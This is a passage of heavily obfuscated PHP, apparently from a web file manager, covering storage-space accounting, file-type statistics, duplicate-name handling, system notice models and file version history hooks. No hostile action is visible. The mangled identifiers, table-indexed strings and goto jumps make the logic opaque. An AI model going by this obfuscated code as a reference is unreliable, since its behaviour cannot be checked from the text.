$Ó…‚»ëß[$¤÷ö•É“[548]], $¤÷ö•É“[630] => array($¤÷ö•É“[590], $Ó…‚»ëß[$¤÷ö•É“[563]] . $”Ê€úô° . $¤÷ö•É“[591])); $³ÒÉÂ†Á = $¤÷ö•É“[2173]; $Š…ÄÂë = $this->field($³ÒÉÂ†Á)->where($¬Ší³¶­)->select(); $¬Ší³¶­[$¤÷ö•É“[462]] = 0; $âñëÍšŠ = $this->field($³ÒÉÂ†Á)->where($¬Ší³¶­)->select(); if (!$âñëÍšŠ) { return; } $Š…ÄÂë[] = $Ó…‚»ëß; $Š…ÄÂë = array_to_keyvalue($Š…ÄÂë, $¤÷ö•É“[181]); foreach ($Š…ÄÂë as $–¯Ğ…£É => $—¬×¹úÓ) { $Š…ÄÂë[$–¯Ğ…£É][$¤÷ö•É“[2174]] = $Š…ÄÂë[$–¯Ğ…£É][$¤÷ö•É“[76]]; $Š…ÄÂë[$–¯Ğ…£É][$¤÷ö•É“[76]] = 0; } foreach ($âñëÍšŠ as $—¬×¹úÓ) { $ËÊëë¼· = $—¬×¹úÓ[$¤÷ö•É“[180]] . $¤÷ö•É“[12]; if (!isset($Š…ÄÂë[$ËÊëë¼·])) { continue; } if ($—¬×¹úÓ[$¤÷ö•É“[482]] == $Š…ÄÂë[$ËÊëë¼·][$¤÷ö•É“[482]]) { $Š…ÄÂë[$ËÊëë¼·][$¤÷ö•É“[76]] += $—¬×¹úÓ[$¤÷ö•É“[76]]; } } foreach ($Š…ÄÂë as $—¬×¹úÓ) { $Ü¹±¾¤Û = $this->parentLevelArray($—¬×¹úÓ[$¤÷ö•É“[563]]); foreach ($Ü¹±¾¤Û as $ËÊëë¼·) { $ËÊëë¼· = $ËÊëë¼· . $¤÷ö•É“[12]; if (!isset($Š…ÄÂë[$ËÊëë¼·])) { continue; } if ($—¬×¹úÓ[$¤÷ö•É“[482]] == $Š…ÄÂë[$ËÊëë¼·][$¤÷ö•É“[482]]) { $Š…ÄÂë[$ËÊëë¼·][$¤÷ö•É“[76]] += $—¬×¹úÓ[$¤÷ö•É“[76]]; } } } $ªõõÛÉ‹ = array(); foreach ($Š…ÄÂë as $—¬×¹úÓ) { if ($—¬×¹úÓ[$¤÷ö•É“[76]] == $—¬×¹úÓ[$¤÷ö•É“[2174]]) { continue; } $ªõõÛÉ‹[] = array($¤÷ö•É“[181], $—¬×¹úÓ[$¤÷ö•É“[181]], $¤÷ö•É“[76], $—¬×¹úÓ[$¤÷ö•É“[76]]); } $this->saveAll($ªõõÛÉ‹); } public function userSpaceReset($£ª’é˜ = false) { $À¸„†ş =& $_SERVER[–Ú¬çÁ]; $¬­÷ª = $this->where(array($À¸„†ş[178] => self::TYPE_USER, $À¸„†ş[548] => $£ª’é˜, $À¸„†ş[462] => 0))->sum($À¸„†ş[76]); $¬­÷ª = !$¬­÷ª || $¬­÷ª <= 0 ? 0 : $¬­÷ª; Model($À¸„†ş[556])->userEdit($£ª’é˜, array($À¸„†ş[1853] => $¬­÷ª)); } public function targetSpaceUpdate($´Ø†•¨§, $“ûÃÕÕ™) { $º¦¤«œù =& $_SERVER[–Ú¬çÁ]; if (!$“ûÃÕÕ™) { return; } if (!in_array($´Ø†•¨§, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ş³öµØÖ = $this->targetSpaceSize($´Ø†•¨§, $“ûÃÕÕ™); if ($´Ø†•¨§ == self::TYPE_USER) { Model($º¦¤«œù[556])->userEdit($“ûÃÕÕ™, array($º¦¤«œù[1853] => $ş³öµØÖ)); } else { if ($´Ø†•¨§ == self::TYPE_GROUP) { Model($º¦¤«œù[564])->groupEdit($“ûÃÕÕ™, array($º¦¤«œù[1853] => $ş³öµØÖ)); } } } public function targetSpaceSize($¤ÇæÚ¶, $œÆ‹ß) { $î˜ÖØ×ô =& $_SERVER[–Ú¬çÁ]; $›‘öÚş = 0; $†ÊÆùù = $this->targetSourceRoot($¤ÇæÚ¶, $œÆ‹ß, !0); foreach ($†ÊÆùù as $ÆÍ™Ê‘Æ) { if (!$ÆÍ™Ê‘Æ) { continue; } $›‘öÚş += floatval($ÆÍ™Ê‘Æ[$î˜ÖØ×ô[76]]); $‡Ë°İ•ü = array($î˜ÖØ×ô[630] => array($î˜ÖØ×ô[590], $î˜ÖØ×ô[573] . $ÆÍ™Ê‘Æ[$î˜ÖØ×ô[181]] . $î˜ÖØ×ô[591])); $ óÏİ›Ë = Model($î˜ÖØ×ô[480])->field($î˜ÖØ×ô[468])->where($‡Ë°İ•ü)->select(); $ óÏİ›Ë = array_to_keyvalue($ óÏİ›Ë, $î˜ÖØ×ô[12], $î˜ÖØ×ô[181]); $ óÏİ›Ë = array_unique(array_filter($ óÏİ›Ë)); if ($ óÏİ›Ë) { $‡Ë°İ•ü = array($î˜ÖØ×ô[468] => array($î˜ÖØ×ô[469], $ óÏİ›Ë)); $›‘öÚş += floatval($this->where($‡Ë°İ•ü)->sum($î˜ÖØ×ô[76])); } } $›‘öÚş = !$›‘öÚş || $›‘öÚş <= 0 ? 0 : $›‘öÚş; return $›‘öÚş; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ôèü“) { return $this->fileTypeProfile($Ôèü“, SourceModel::TYPE_USER); } public function groupFileTypeProfile($î„À±È‘) { return $this->fileTypeProfile($î„À±È‘, SourceModel::TYPE_GROUP); } private function fileTypeProfile($øÎÆ×Øõ, $¢‰úÉ¬ó) { $¤çº˜Æ =& $_SERVER[–Ú¬çÁ]; $Ç®©õ³ = $¤çº˜Æ[2175] . $øÎÆ×Øõ . $¤çº˜Æ[11] . $¢‰úÉ¬ó; $ª”äçšâ = Cache::get($Ç®©õ³); if ($ª”äçšâ) { return $ª”äçšâ; } $‹ÌˆùØ† = array($¤çº˜Æ[624] => 0); if ($øÎÆ×Øõ != !1) { $‹ÌˆùØ†[$¤çº˜Æ[548]] = $øÎÆ×Øõ; $‹ÌˆùØ†[$¤çº˜Æ[178]] = $¢‰úÉ¬ó; } $¯ˆäØ = array(); $¯ˆäØ[$¤çº˜Æ[2176]] = array($¤çº˜Æ[2177] => LNG($¤çº˜Æ[2176]), $¤çº˜Æ[2178] => $this->where($‹ÌˆùØ†)->count(), $¤çº˜Æ[595] => $this->where($‹ÌˆùØ†)->sum($¤çº˜Æ[76])); $·ñ¦Ğ‡¬ = KodIO::fileTypeList(); foreach ($·ñ¦Ğ‡¬ as $¦·éÔ¿Ë => $©É»†²¿) { $‹ÌˆùØ†[$¤çº˜Æ[463]] = $this->fileTypeWhere($¦·éÔ¿Ë); $¯ˆäØ[$¦·éÔ¿Ë] = array($¤çº˜Æ[2177] => $©É»†²¿[$¤çº˜Æ[32]], $¤çº˜Æ[2178] => $this->where($‹ÌˆùØ†)->count(), $¤çº˜Æ[595] => $this->where($‹ÌˆùØ†)->sum($¤çº˜Æ[76])); } Cache::set($Ç®©õ³, $¯ˆäØ, 1200); return $¯ˆäØ; } public function fileNameExist($”Æà“ª¹, $İÎÜ‚»Ø) { $É™…ÙÌ° =& $_SERVER[–Ú¬çÁ]; $ìƒ‘çØØ = $this->field($É™…ÙÌ°[2179])->where(array($É™…ÙÌ°[180] => $”Æà“ª¹, $É™…ÙÌ°[32] => $İÎÜ‚»Ø, $É™…ÙÌ°[482] => 0))->find(); return is_array($ìƒ‘çØØ) ? $ìƒ‘çØØ[$É™…ÙÌ°[181]] : !1; } public function childList($ìÉä·Û) { $â¨êö =& $_SERVER[–Ú¬çÁ]; $ÏÇÓ¬µÙ = $â¨êö[2152] . $ìÉä·Û; if (isset(self::$cacheChildList[$ÏÇÓ¬µÙ])) { return self::$cacheChildList[$ÏÇÓ¬µÙ]; } $ÑË»°”† = array($â¨êö[180] => intval($ìÉä·Û), $â¨êö[482] => 0); $ÍÄï½¤¾ = $this->where($ÑË»°”†)->select(); $ÍÄï½¤¾ = $ÍÄï½¤¾ ? $ÍÄï½¤¾ : array(); self::$cacheChildList[$ÏÇÓ¬µÙ] = $ÍÄï½¤¾; foreach ($ÍÄï½¤¾ as $õ’Ù«ã) { $ÏÇÓ¬µÙ = $â¨êö[510] . $õ’Ù«ã[$â¨êö[181]]; self::$cacheSourceInfo[$ÏÇÓ¬µÙ] = $õ’Ù«ã; } return $ÍÄï½¤¾; } public function fileNameAuto($“Ã°Ó†é, $û¿™–±”, $ĞĞİ´Û¦ = REPEAT_RENAME, $ËöÑ•ƒµ = false) { $ŸÍ¼œí¡ =& $_SERVER[–Ú¬çÁ]; $ç¡›Çñİ = get_path_ext($û¿™–±”); $›¯’´äş = $ç¡›Çñİ ? basename($û¿™–±”, $ŸÍ¼œí¡[10] . $ç¡›Çñİ) . $ŸÍ¼œí¡[2180] . $ç¡›Çñİ : $û¿™–±” . $ŸÍ¼œí¡[437]; $¹Ú£è¶” = array($ŸÍ¼œí¡[180] => $“Ã°Ó†é, $ŸÍ¼œí¡[482] => 0, $ŸÍ¼œí¡[32] => array($ŸÍ¼œí¡[436], $›¯’´äş)); $å€ñŸâ× = $this->field($ŸÍ¼œí¡[32])->where($¹Ú£è¶”)->select(); $ÀÓ»¼ÃŠ = array_to_keyvalue($å€ñŸâ×, $ŸÍ¼œí¡[12], $ŸÍ¼œí¡[32]); return $this->fileNameAutoGet($ÀÓ»¼ÃŠ, $û¿™–±”, $ĞĞİ´Û¦, $ËöÑ•ƒµ); } public function fileNameAutoGet($úæ±ùÜÄ, $×…”úŞÃ, $™»Û¸ê, $­Êà¿Ê°) { $ŞİŒã»¡ =& $_SERVER[–Ú¬çÁ]; if ($™»Û¸ê == REPEAT_REPLACE || !$úæ±ùÜÄ || !in_array_not_case($×…”úŞÃ, $úæ±ùÜÄ) || $­Êà¿Ê° && $™»Û¸ê != REPEAT_RENAME_FOLDER) { return $×…”úŞÃ; } if ($™»Û¸ê == REPEAT_SKIP) { return !1; } $ÈÉ¬çâö = $ŞİŒã»¡[10] . get_path_ext($×…”úŞÃ); $ÈÉ¬çâö = $ÈÉ¬çâö == $ŞİŒã»¡[10] || $­Êà¿Ê° ? $ŞİŒã»¡[12] : $ÈÉ¬çâö; for ($¡¡é‰İÍ = 1; $¡¡é‰İÍ <= count($úæ±ùÜÄ) + 1; $¡¡é‰İÍ++) { $¸ş‘µ­÷ = substr($×…”úŞÃ, 0, strlen($×…”úŞÃ) - strlen($ÈÉ¬çâö)); $‰¬ĞŞòÆ = $¸ş‘µ­÷ . "\x28{$¡¡é‰İÍ}\x29{$ÈÉ¬çâö}"; if (!in_array_not_case($‰¬ĞŞòÆ, $úæ±ùÜÄ)) { return $‰¬ĞŞòÆ; } } } } $_file = $_SERVER[$_SERVER[–Ú¬çÁ][200]]; $_size = $_SERVER[–Ú¬çÁ][201]; goto bÅ—‡ìğ©‚; fÉ¢é¿µ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\156\157\x74\151\143\145\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\143\x6f\x6e\x74\x65\x6e\164", "\x61\x75\164\150", "\x6d\157\144\145", "\164\151\155\145", "\164\x79\160\x65", "\154\145\x76\145\x6c", "\x65\156\141\x62\154\x65", "\x73\157\162\x74"); public function listData($İ„İ†á« = false, $ó‘çĞâü = "\x73\x6f\162\x74", $˜Ş¹éü = false) { return parent::listData($İ„İ†á«, $ó‘çĞâü, $˜Ş¹éü); } public function add($ËˆšëĞ¬) { $ø´­ˆˆÆ =& $_SERVER[–Ú¬çÁ]; $²ÇÖŠ§³ = time(); if ($ËˆšëĞ¬[$ø´­ˆˆÆ[16]] == $ø´­ˆˆÆ[2299]) { $²ÇÖŠ§³ = strtotime($ËˆšëĞ¬[$ø´­ˆˆÆ[194]]); } $ËˆšëĞ¬[$ø´­ˆˆÆ[194]] = $²ÇÖŠ§³; return parent::insert($ËˆšëĞ¬); } public function update($Á’“î£ï, $Œ“ã) { $òŠÌÈ¨Ú =& $_SERVER[–Ú¬çÁ]; $†ú´®³æ = $this->listData($Á’“î£ï); if (!$†ú´®³æ) { return !1; } $…Ÿï“ëµ = time(); if ($Œ“ã[$òŠÌÈ¨Ú[16]] == $òŠÌÈ¨Ú[2299]) { $…Ÿï“ëµ = strtotime($Œ“ã[$òŠÌÈ¨Ú[194]]); } $Œ“ã[$òŠÌÈ¨Ú[194]] = $…Ÿï“ëµ; return parent::update($Á’“î£ï, $Œ“ã); } public function remove($Š—Á›áÄ) { $Ö¬ùË˜ì = $this->listData($Š—Á›áÄ); if (!$Ö¬ùË˜ì || $Ö¬ùË˜ì[$_SERVER[–Ú¬çÁ][179]]) { return !1; } return parent::remove($Š—Á›áÄ); } public function sort($·Ê”ÎÈç, $éĞ¹ÕÂ) { return parent::update($·Ê”ÎÈç, $éĞ¹ÕÂ); } public function enable($€ì•®, $ë±ã»ğ˜) { return parent::update($€ì•®, array($_SERVER[–Ú¬çÁ][2300] => $ë±ã»ğ˜)); } private function initUserOption() { $ÃÙ‡áø =& $_SERVER[–Ú¬çÁ]; $this->optionType = $ÃÙ‡áø[2301]; $this->modelType = $ÃÙ‡áø[2302]; $this->field = array($ÃÙ‡áø[2303], $ÃÙ‡áø[32], $ÃÙ‡áø[194], $ÃÙ‡áø[33], $ÃÙ‡áø[2304], $ÃÙ‡áø[770], $ÃÙ‡áø[220]); } public function userNoticeGet($Œø¶³ = false) { $this->initUserOption(); return parent::listData($Œø¶³, $_SERVER[–Ú¬çÁ][452], !0); } public function userNoticeAdd($åÒ´±¸Ù) { $„¦Í²êÅ =& $_SERVER[–Ú¬çÁ]; $this->initUserOption(); $Ğá©œÎ² = $this->findByKey($„¦Í²êÅ[2303], $åÒ´±¸Ù[$„¦Í²êÅ[452]]); if ($Ğá©œÎ²) { return !0; } $ÙÄç×¤ò = array($„¦Í²êÅ[2303] => $åÒ´±¸Ù[$„¦Í²êÅ[452]], $„¦Í²êÅ[32] => $åÒ´±¸Ù[$„¦Í²êÅ[32]], $„¦Í²êÅ[194] => $åÒ´±¸Ù[$„¦Í²êÅ[194]], $„¦Í²êÅ[33] => isset($åÒ´±¸Ù[$„¦Í²êÅ[33]]) ? $åÒ´±¸Ù[$„¦Í²êÅ[33]] : 1, $„¦Í²êÅ[2304] => isset($åÒ´±¸Ù[$„¦Í²êÅ[2304]]) ? $åÒ´±¸Ù[$„¦Í²êÅ[2304]] : 0, $„¦Í²êÅ[770] => 0, $„¦Í²êÅ[220] => 0); return parent::insert($ÙÄç×¤ò); } public function userNoticeEdit($½¡”Ú™½, $àÉÓü“) { $this->initUserOption(); return parent::update($½¡”Ú™½, $àÉÓü“); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\155\x5f\x6f\160\x74\151\157\x6e"; protected $jsonField = array("\155\145\156\x75", "\x72\157\x6c\x65", "\x72\157\154\x65\107\x72\x6f\165\160", "\162\x65\x67\151\163\x74", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($Š–ºüµÏ) { return "\x53\x79\x73\x74\145\155\x4f\x70\164\x69\x6f\x6e\137{$Š–ºüµÏ}"; } protected function optionDefault($‹ÔÅ¢™ğ = '') { $²ÖĞ©³ç =& $_SERVER[–Ú¬çÁ]; if ($‹ÔÅ¢™ğ == $²ÖĞ©³ç[12]) { return $GLOBALS[$²ÖĞ©³ç[6]][$²ÖĞ©³ç[434]]; } } } class SystemRecordModel extends ModelBaseLight { } goto DÛ„ğ­áÕ¦; AŸöñ´¨º´: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $èäª·•Ã =& $_SERVER[–Ú¬çÁ]; $Ã©ªÚÂ = $GLOBALS[$èäª·•Ã[6]][$èäª·•Ã[89]]; if ($Ã©ªÚÂ[$èäª·•Ã[1236]] != 1) { return; } if ($Ã©ªÚÂ[$èäª·•Ã[1237]] <= 0) { return; } if (isset($_REQUEST[$èäª·•Ã[1238]]) && $_REQUEST[$èäª·•Ã[1238]] == $èäª·•Ã[88]) { return; } Hook::bind($èäª·•Ã[1239], $èäª·•Ã[1240]); Hook::bind($èäª·•Ã[1241], $èäª·•Ã[1242]); Hook::bind($èäª·•Ã[1243], $èäª·•Ã[1244]); Hook::bind($èäª·•Ã[1245], $èäª·•Ã[1246]); Hook::bind($èäª·•Ã[1247], $èäª·•Ã[1248]); Hook::bind($èäª·•Ã[1249], $èäª·•Ã[1250]); } public static function eventBeforeUpload($¼½”Üø¹) { if ($¼½”Üø¹[3] && $¼½”Üø¹[3] != REPEAT_REPLACE) { return; } $Æ„©©­§ = self::parsePath($¼½”Üø¹[0]); if (!$Æ„©©­§) { return; } self::add($Æ„©©­§); } public static function eventBeforeEdit($¹Í£Óˆ˜) { $È×»³ÓÎ = self::parsePath($¹Í£Óˆ˜[0]); if (!$È×»³ÓÎ) { return; } self::add($È×»³ÓÎ); } public static function eventBeforeCopyFile($¢¢¿©å, $õŸûï§, $ÂÂªá¢, $ÆÛş’Ê, $³Ñš¡ù›, $ÂÕÄºè») { $¯¢Ã®“í =& $_SERVER[–Ú¬çÁ]; if (isset($ÂÂªá¢->_data[$¯¢Ã®“í[1175]]) && $ÂÂªá¢->_data[$¯¢Ã®“í[1175]]) { return; } $ãúÎÍš = $ÂÂªá¢->getPathOuter($ÆÛş’Ê); $ÒúÁãö = self::parsePath($ãúÎÍš); if (!$ÒúÁãö) { return; } self::add($ÒúÁãö); } public static function eventBeforeRename($íÆÈ÷) { $Ûé©¹·º =& $_SERVER[–Ú¬çÁ]; $Àş¢ß¿ = self::parsePath($íÆÈ÷[0]); if (!$Àş¢ß¿) { return; } $ÇäÀÂ˜© = self::checkInHistory($Àş¢ß¿); if (!$ÇäÀÂ˜©) { return; } if ($ÇäÀÂ˜©[$Ûé©¹·º[33]] == $Ûé©¹·º[224]) { $¹ñ¬‘ê™ = self::listData($Àş¢ß¿); if ($¹ñ¬‘ê™ && $¹ñ¬‘ê™[$Ûé©¹·º[422]]) { self::moveHistory($Àş¢ß¿, $íÆÈ÷[1]); } } else { IO::rename($ÇäÀÂ˜©[$Ûé©¹·º[84]], $íÆÈ÷[1]); } } public static function eventBeforeMove($õ´¨Ïú) { $ÏÆÎ¡†ß =& $_SERVER[–Ú¬çÁ]; $·Š”Ö¬‡ = self::parsePath($õ´¨Ïú[0]); if (!$·Š”Ö¬‡) { return; } $éöŞèã„ = self::parsePath($õ´¨Ïú[1]); if (!$éöŞèã„) { return; } $šÉ€¥Ü = $õ´¨Ïú[3]; $‚­ßİ°ı = self::checkInHistory($·Š”Ö¬‡); if (!$‚­ßİ°ı) { return; } $Êå”¤ƒ» = self::pathHistory($éöŞèã„); if ($‚­ßİ°ı[$ÏÆÎ¡†ß[33]] == $ÏÆÎ¡†ß[224]) { $ÔíûŠ¨ = self::listData($·Š”Ö¬‡); $‰íï±ªï = rtrim($éöŞèã„, $ÏÆÎ¡†ß[8]) . $ÏÆÎ¡†ß[8] . ($šÉ€¥Ü ? $šÉ€¥Ü : get_path_this($·Š”Ö¬‡)); $®¥ıÜìĞ = self::listData($‰íï±ªï); if ($ÔíûŠ¨ && $ÔíûŠ¨[$ÏÆÎ¡†ß[422]] && $®¥ıÜìĞ && $®¥ıÜìĞ[$ÏÆÎ¡†ß[422]]) { return self::clear($·Š”Ö¬‡); } if ($ÔíûŠ¨ && $ÔíûŠ¨[$ÏÆÎ¡†ß[422]]) { self::moveHistory($·Š”Ö¬‡, $šÉ€¥Ü, $Êå”¤ƒ»); } } else { IO::move($‚­ßİ°ı[$ÏÆÎ¡†ß[84]], $Êå”¤ƒ», !1, $šÉ€¥Ü); self::clearEmptyFolder(IO::pathFather($‚­ßİ°ı[$ÏÆÎ¡†ß[84]])); } } public static function eventAfterRemove($‰ñÜÈÃ, $ŞÂº¦õÒ) { $ÚœÂşÇ£ =& $_SERVER[–Ú¬çÁ]; if (!$ŞÂº¦õÒ) { return; } $ßÉäÚËö = self::parsePath($‰ñÜÈÃ[0]); if (!$ßÉäÚËö) { return; } $šÄ¤â‡Å = self::checkInHistory($ßÉäÚËö); if (!$šÄ¤â‡Å) { return; } if ($šÄ¤â‡Å[$ÚœÂşÇ£[33]] == $ÚœÂşÇ£[224]) { $Á×¢îİ = self::listData($ßÉäÚËö, !1); if ($Á×¢îİ && $Á×¢îİ[$ÚœÂşÇ£[422]]) { self::clear($ßÉäÚËö, !1); } } else { IO::remove($šÄ¤â‡Å[$ÚœÂşÇ£[84]]); self::clearEmptyFolder(IO::pathFather($šÄ¤â‡Å[$ÚœÂşÇ£[84]])); } } private static function checkInHistory($Ç±šÎıÈ) { $ĞÒ¼¼Õë = self::pathHistory($Ç±šÎıÈ); if (!IO::exist($ĞÒ¼¼Õë)) { $ĞÒ¼¼Õë .= $_SERVER[–Ú¬çÁ][1251]; } return IO::exist($ĞÒ¼¼Õë) ? IO::info($ĞÒ¼¼Õë) : !1; } private static function parsePath($Ÿşˆ‚ÙÇ) { $¬Â¼ÈÃÕ =& $_SERVER[–Ú¬çÁ]; if (!$Ÿşˆ‚ÙÇ) { return !1; } if ($GLOBALS[$¬Â¼ÈÃÕ[1252]]) { return; } $ÍáÈå€ = KodIO::parse($Ÿşˆ‚ÙÇ); $ò©Üœ = $ÍáÈå€[$¬Â¼ÈÃÕ[33]]; $ë‡–úÑÂ = !$ò©Üœ || $ò©Üœ == KodIO::KOD_IO || $ò©Üœ == KodIO::KOD_SHARE_ITEM; if (!$ë‡–úÑÂ || !$ÍáÈå€[$¬Â¼ÈÃÕ[1253]]) { return !1; } if (substr($Ÿşˆ‚ÙÇ, 0, strlen(DATA_PATH . $¬Â¼ÈÃÕ[1254])) == DATA_PATH . $¬Â¼ÈÃÕ[1254]) { return !1; } if ($ò©Üœ == KodIO::KOD_SHARE_ITEM) { $¦ùÌ¥ƒ£ = IO::init($Ÿşˆ‚ÙÇ); if ($¦ùÌ¥ƒ£->pathParse[$¬Â¼ÈÃÕ[1171]]) { return self::parsePath($¦ùÌ¥ƒ£->pathParse[$¬Â¼ÈÃÕ[1171]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $’ªò–Ê‰ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¬Â¼ÈÃÕ[1255]); foreach ($’ªò–Ê‰ as $íåîú®Ê) { if (!$ò©Üœ && substr($Ÿşˆ‚ÙÇ, 0, strlen($íåîú®Ê)) == $íåîú®Ê) { return !1; } } self::log($GLOBALS[$¬Â¼ÈÃÕ[1166]] . $¬Â¼ÈÃÕ[1256] . $Ÿşˆ‚ÙÇ); return $Ÿşˆ‚ÙÇ; } private static function pathHistory($‰˜õÖî) { $•ÛÃ¿†“ =& $_SERVER[–Ú¬çÁ]; $å—¾ÑŸ = self::$_historyBase . ltrim(KodIO::clear($‰˜õÖî), $•ÛÃ¿†“[8]); $å—¾ÑŸ = str_replace(array($•ÛÃ¿†“[1257]), array($•ÛÃ¿†“[1258]), $å—¾ÑŸ); return $å—¾ÑŸ; } public static function log($òšüÖ¦Î) { } public static function historyCount($øÅ¶±ºû) { $Ú“ÛÀ¢¬ =& $_SERVER[–Ú¬çÁ]; $¢›µšïÊ = array(); $Ÿé–šŸª = array(); foreach ($øÅ¶±ºû as $’â“• ) { $öö‚¦ÛÎ = get_path_father($’â“• ); if (!$Ÿé–šŸª[$öö‚¦ÛÎ]) { $Ÿé–šŸª[$öö‚¦ÛÎ] = array(); } $Ÿé–šŸª[$öö‚¦ÛÎ][] = get_path_this($’â“• ); } foreach ($Ÿé–šŸª as $öö‚¦ÛÎ => $œºÇ¹¸«) { $Õ÷êÁñ– = self::parsePath($öö‚¦ÛÎ); if (!$Õ÷êÁñ–) { continue; } foreach ($œºÇ¹¸« as $‡Œ²İÈ©) { $ÏıÜåá = self::listData(rtrim($Õ÷êÁñ–, $Ú“ÛÀ¢¬[8]) . $Ú“ÛÀ¢¬[8] . $‡Œ²İÈ©, !1); if ($ÏıÜåá && $ÏıÜåá[$Ú“ÛÀ¢¬[422]]) { $¢›µšïÊ[rtrim($öö‚¦ÛÎ, $Ú“ÛÀ¢¬[8]) . $Ú“ÛÀ¢¬[8] . $‡Œ²İÈ©] = count($ÏıÜåá[$Ú“ÛÀ¢¬[422]]); } } } return $¢›µšïÊ; } public static function add($©àíë±·) { $ùñìúÅ =& $_SERVER[–Ú¬çÁ]; $Æş½¶€… = self::listData($©àíë±·); if (!$Æş½¶€…) { return; } $àÁÕµ£Ì = Model($ùñìúÅ[790])->get($ùñìúÅ[1259]); $¥—öœ½Ö = intval($GLOBALS[$ùñìúÅ[6]][$ùñìúÅ[89]][$ùñìúÅ[1237]]); $’ëÜ¡»– = $àÁÕµ£Ì == $ùñìúÅ[1260] ? min(5, $¥—öœ½Ö) : $¥—öœ½Ö; if ($¥—öœ½Ö <= 0) { return; } $“ƒÆÜ = IO::info($©àíë±·); $¨©É›É = $Æş½¶€…[$ùñìúÅ[422]]; if ($“ƒÆÜ[$ùñìúÅ[76]] == 0) { return; } if ($“ƒÆÜ[$ùñìúÅ[76]] >= 1024 * 1024 * 500) { return !1; } $×ÅÓ¿’¥ = IO::hashSimple($©àíë±·); if ($¨©É›É && $¨©É›É[0][$ùñìúÅ[650]] == $×ÅÓ¿’¥) { return !0; } if (array_key_exists($ùñìúÅ[227], $“ƒÆÜ) && !$“ƒÆÜ[$ùñìúÅ[227]]) { return !1; } $‰üÚ€é = short_id(time()); $É¸’Ğşş = array($ùñìúÅ[452] => $‰üÚ€é, $ùñìúÅ[650] => $×ÅÓ¿’¥, $ùñìúÅ[32] => $“ƒÆÜ[$ùñìúÅ[32]] . $ùñìúÅ[10] . date($ùñìúÅ[1261]) . rand_string(1), $ùñìúÅ[76] => $“ƒÆÜ[$ùñìúÅ[76]], $ùñìúÅ[504] => USER_ID, $ùñìúÅ[225] => time(), $ùñìúÅ[1262] => $ùñìúÅ[12]); IO::mkdir($Æş½¶€…[$ùñìúÅ[1263]]); $œ°™»±’ = IO::copy($©àíë±·, $Æş½¶€…[$ùñìúÅ[1263]], !1, $É¸’Ğşş[$ùñìúÅ[32]]); if (!$œ°™»±’) { self::clearEmptyFolder($Æş½¶€…[$ùñìúÅ[1263]]); return !1; } array_unshift($¨©É›É, $É¸’Ğşş); if (count($¨©É›É) > $’ëÜ¡»–) { $ãŸÕ¬©Á = array_slice($¨©É›É, $’ëÜ¡»–); foreach ($ãŸÕ¬©Á as $‡í®—ì) { IO::remove($Æş½¶€…[$ùñìúÅ[1263]] . $‡í®—ì[$ùñìúÅ[32]]); } $¨©É›É = array_slice($¨©É›É, 0, $’ëÜ¡»–); } return self::saveData($Æş½¶€…[$ùñìúÅ[1264]], $¨©É›É); } public static function remove($¦Ñõ³‡Š, $ÛÁÂ©Ç) { $Ò‘Éüè =& $_SERVER[–Ú¬çÁ]; $«Êü”îÖ = self::listData($¦Ñõ³‡Š); $‚ñ±õÄ = array(); if (!$«Êü”îÖ) { return !1; } foreach ($«Êü”îÖ[$Ò‘Éüè[422]] as $êè‹˜Ì™) { if ($êè‹˜Ì™[$Ò‘Éüè[452]] == $ÛÁÂ©Ç) { IO::remove($«Êü”îÖ[$Ò‘Éüè[1263]] . $êè‹˜Ì™[$Ò‘Éüè[32]]); continue; } $‚ñ±õÄ[] = $êè‹˜Ì™; } return self::saveData($«Êü”îÖ[$Ò‘Éüè[1264]], $‚ñ±õÄ); } public static function clear($’¦âÉ“®, $ªŒŠÜ¿… = true) { $ö„Øó±ˆ =& $_SERVER[–Ú¬çÁ]; $–—ÉßƒÎ = self::listData($’¦âÉ“®, $ªŒŠÜ¿…); if (!$–—ÉßƒÎ) { return !1; } foreach ($–—ÉßƒÎ[$ö„Øó±ˆ[422]] as $º€Ö«É) { IO::remove($–—ÉßƒÎ[$ö„Øó±ˆ[1263]] . $º€Ö«É[$ö„Øó±ˆ[32]]); } return self::saveData($–—ÉßƒÎ[$ö„Øó±ˆ[1264]], array()); } public static function moveHistory($ÈüÙÆ«, $¶£¤ÈÓÃ = '', $¨îÔÂ¥ = '') { $Çøñì—Ë =& $_SERVER[–Ú¬çÁ]; $ŸÀÚÀøÆ = self::listData($ÈüÙÆ«, !1); if (!$ŸÀÚÀøÆ || !$ŸÀÚÀøÆ[$Çøñì—Ë[422]]) { return !1; } $¤®Õ¼ù = $Çøñì—Ë[1251]; $¶£¤ÈÓÃ = $¶£¤ÈÓÃ ? $¶£¤ÈÓÃ : get_path_this($ÈüÙÆ«); $¨îÔÂ¥ = $¨îÔÂ¥ ? $¨îÔÂ¥ : $ŸÀÚÀøÆ[$Çøñì—Ë[1263]]; $´äÀ¨à = substr(get_path_this($ŸÀÚÀøÆ[$Çøñì—Ë[1264]]), 0, -strlen($¤®Õ¼ù)); foreach ($ŸÀÚÀøÆ[$Çøñì—Ë[422]] as $Šû¯ìõ => $ÆÛŠò™) { $Ä®æÛâ« = $¶£¤ÈÓÃ . substr($ÆÛŠò™[$Çøñì—Ë[32]], strlen($´äÀ¨à)); $Ùİºì¬ƒ = IO::move($ŸÀÚÀøÆ[$Çøñì—Ë[1263]] . $ÆÛŠò™[$Çøñì—Ë[32]], $¨îÔÂ¥, !1, $Ä®æÛâ«); if ($Ùİºì¬ƒ) { $ŸÀÚÀøÆ[$Çøñì—Ë[422]][$Šû¯ìõ][$Çøñì—Ë[32]] = $Ä®æÛâ«; } } $ŸÀÚÀøÆ[$Çøñì—Ë[1264]] = IO::move($ŸÀÚÀøÆ[$Çøñì—Ë[1264]], $¨îÔÂ¥, !1, $¶£¤ÈÓÃ . $¤®Õ¼ù); self::saveData($ŸÀÚÀøÆ[$Çøñì—Ë[1264]], $ŸÀÚÀøÆ[$Çøñì—Ë[422]]); self::clearEmptyFolder($ŸÀÚÀøÆ[$Çøñì—Ë[1263]]); } public static function 